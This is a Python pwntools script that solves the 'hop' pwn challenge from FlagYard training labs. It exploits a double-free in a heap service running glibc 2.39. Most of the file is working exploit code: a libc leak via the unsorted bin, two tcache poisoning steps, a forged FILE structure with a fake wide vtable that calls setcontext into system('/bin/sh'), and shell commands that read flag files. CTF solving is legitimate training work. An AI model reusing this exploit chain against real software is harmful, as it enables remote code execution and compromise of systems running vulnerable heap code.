#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hop  -  FlagYard Pwn solver

hop (FlagYard Training Labs, Pwn / SAFCSP) - a tiny "Robot Factory" heap service
with a use-after-free / double-free in `scrap robot`. glibc 2.39, PIE + Full
RELRO, no win function.

Plan:

    leak libc via an unsorted-bin chunk (fd == main_arena+0x60)
    -> tcache poisoning with a double-free (keeps counts>0, which glibc 2.39's
       _int_malloc requires before it will hand out a tcache entry)
    -> forge a FILE at a chosen libc .bss address and point _IO_list_all at it
    -> exit() flushes the fake FILE: _IO_wfile_jumps -> _IO_wfile_overflow ->
       _IO_wdoallocbuf -> fake wide vtable -> setcontext -> system("/bin/sh")

glibc 2.39 offsets hardcoded. Needs pwntools.

Target is given as host:port (default tcp.flagyard.com:31310).
"""
from __future__ import annotations

from pwn import *
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("H O P   S O L V E R",
              "tcache double-free -> FSOP (House of Apple 2) -> shell"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and (argv[1].startswith("http") or ":" in argv[1]):
        return argv[1].strip()
    raw = input("  Enter the hop challenge target (host:port): ").strip()
    return raw or "tcp.flagyard.com:31310"

def parse_target(raw):
    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
    if ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "31310"
    return host, int(port_s)

def read_flag(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

# ---------------------------------------------------------------------------
# offsets (this instance's glibc 2.39)
# ---------------------------------------------------------------------------
LIB_SYSTEM          = 0x58750      # system
LIB_IO_WFILE_JUMPS  = 0x202228     # _IO_wfile_jumps
LIB_SETCONTEXT      = 0x4a960      # setcontext
LIB_IO_LIST_ALL     = 0x2044c0     # _IO_list_all
MAIN_ARENA_LEAK     = 0x203b20     # unsorted fd = main_arena + 0x60
FAKE_OFF            = 0x210000     # libc .bss scratch for the fake FILE
WD                  = 0x208        # wide_data lives 8 bytes in (keeps RSP 8-mod-16)

class Retry(Exception):
    """newline collision / transient failure -> reconnect and try again."""

# ---------------------------------------------------------------------------
# challenge interaction
# ---------------------------------------------------------------------------
def connect(host, port):
    for _ in range(5):
        try:
            return remote(host, port, timeout=10)
        except Exception:
            time.sleep(2)
    return None

def _guard(name):
    if b"\n" in name:
        raise Retry()

def add(io, size, name, age=7):
    _guard(name)
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b"Name size: ", str(size).encode())
    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Age: ", str(age).encode())

def show(io, idx):
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Name: ")
    return io.recvuntil(b"\nAge: ", drop=True)

def scrap(io, idx):
    io.sendlineafter(b">>> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())

def edit(io, idx, size, name):
    _guard(name)
    io.sendlineafter(b">>> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"New name size: ", str(size).encode())
    io.sendlineafter(b"New name: ", name)

def u64pad(raw):
    return u64(raw.ljust(8, b"\x00"))

# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------
def exploit_once(host, port):
    io = connect(host, port)
    if io is None:
        raise Retry()

    # six robots: a leak chunk + guards + two tcache double-free pairs
    add(io, 0x500, b"A" * 0x10)     # 0  unsorted-bin leak
    add(io, 0x20,  b"B" * 0x10)     # 1  guard
    add(io, 0x400, b"C" * 0x10)     # 2  Xa (class 0x410)
    add(io, 0x400, b"D" * 0x10)     # 3  Ya
    add(io, 0x20,  b"E" * 0x10)     # 4  Xb (class 0x30)
    add(io, 0x20,  b"F" * 0x10)     # 5  Yb

    # ---- libc leak from the unsorted bin ----
    scrap(io, 0)
    libc = u64pad(show(io, 0)) - MAIN_ARENA_LEAK
    if libc & 0xFFF or libc < 0x7F0000000000:
        raise Retry()
    fake        = libc + FAKE_OFF
    system      = libc + LIB_SYSTEM
    wfile_jumps = libc + LIB_IO_WFILE_JUMPS
    setcontext  = libc + LIB_SETCONTEXT
    list_all    = libc + LIB_IO_LIST_ALL

    # ---- tcache poison #1: chunk 0x410 -> write the fake FILE at `fake` ----
    # free(X); X->key=0; free(Y); free(X)  ==> counts=3, head=X, X->next=Y
    # then X->next = X>>12 ^ fake  ==> malloc() returns X, malloc() returns fake
    scrap(io, 2)
    encXa = u64pad(show(io, 2))
    edit(io, 2, 0x20, b"\x00" * 8 + p64(0))     # Xa->key = 0 (dodge the double-free check)
    scrap(io, 3)
    scrap(io, 2)
    edit(io, 2, 0x20, p64(encXa ^ fake))         # Xa->next = fake
    add(io, 0x408, b"X" * 0x10)                  # pops Xa  (counts 3 -> 2)

    payload = bytearray(0x407)
    def q(o, v): payload[o:o + 8] = p64(v)
    def d(o, v): payload[o:o + 4] = p32(v)
    d(0x00, 0)                       # FILE._flags
    q(0x28, 1)                       # FILE._IO_write_ptr  (> _IO_write_base)
    q(0x68, fake + 0x380)            # FILE._chain      / ucontext RDI -> "/bin/sh"
    q(0x88, fake + 0x3e0)            # FILE._lock
    q(0xa0, fake + WD)               # FILE._wide_data  / ucontext RSP (8-mod-16)
    q(0xa8, system)                  # ucontext RIP
    d(0xc0, 0)                       # FILE._mode
    q(0xd8, wfile_jumps)             # FILE.vtable
    q(0xe0, fake + 0x3a0)            # ucontext fenv
    d(0x1c0, 0)                      # ucontext mxcsr
    q(WD + 0x18, 0)                  # wide_data->_IO_write_base
    q(WD + 0x20, 1)                  # wide_data->_IO_write_ptr
    q(WD + 0x30, 0)                  # wide_data->_IO_buf_base
    q(WD + 0xe0, fake + 0x300)       # wide_data->_wide_vtable
    q(0x300 + 0x68, setcontext)      # fake wide_vtable->__doallocate
    payload[0x380:0x388] = b"/bin/sh\x00"
    add(io, 0x408, bytes(payload))   # pops fake, writes the FILE (counts 2 -> 1)

    # ---- tcache poison #2: chunk 0x30 -> _IO_list_all = fake ----
    scrap(io, 4)
    encXb = u64pad(show(io, 4))
    edit(io, 4, 0x20, b"\x00" * 8 + p64(0))
    scrap(io, 5)
    scrap(io, 4)
    edit(io, 4, 0x20, p64(encXb ^ list_all))
    add(io, 0x20, b"Y" * 0x8)        # pops Xb
    add(io, 0x20, p64(fake))         # writes _IO_list_all = fake

    # ---- trigger: exit() flushes _IO_list_all -> our fake FILE -> shell ----
    io.sendlineafter(b">>> ", b"5")
    time.sleep(0.5)
    io.sendline(b"echo PWNED; cat flag 2>/dev/null; cat /app/flag 2>/dev/null; cat /flag 2>/dev/null")
    data = io.recvrepeat(3)
    return io, libc, data


def exploit(host, port):
    for attempt in range(1, 60):
        io = None
        try:
            tick(0.20, "triggering the heap and forging the FILE (attempt %d)" % attempt)
            io, libc, data = exploit_once(host, port)
            flag = read_flag(data)
            if flag:
                try: io.close()
                except Exception: pass
                return flag, data, libc
            if b"PWNED" in data:
                try: io.close()
                except Exception: pass
                return "SHELL OK but flag not seen; raw=%r" % data[:300], data, libc
            try: io.close()
            except Exception: pass
            continue
        except Retry:
            try:
                if io: io.close()
            except Exception:
                pass
            continue
        except Exception as e:
            try:
                if io: io.close()
            except Exception:
                pass
            fail("attempt %d error: %s" % (attempt, e))
            continue
    return "FAILED after retries", b"", 0


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()
    context.log_level = "error"

    try:
        raw = ask_target(sys.argv)
    except Exception:
        fail("no challenge target given")
        return
    host, port = parse_target(raw)
    step("target host %s:%d" % (host, port))

    step("connecting to the service")
    result, data, libc = exploit(host, port)
    if result.startswith("FlagY"):
        tick(0.95, "shell spawned and flag read")
        print()
        if libc:
            ok("libc base = %s" % (C.YELLOW + hex(libc) + C.RESET))
        ok("FLAG = %s" % result)
        big_flag(result, time.time() - t0)
        outp = Path(__file__).resolve().parent / "flag_from_hop.txt"
        outp.write_text(result + "\n", encoding="utf-8")
        print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
    else:
        fail(str(result))


if __name__ == "__main__":
    main()
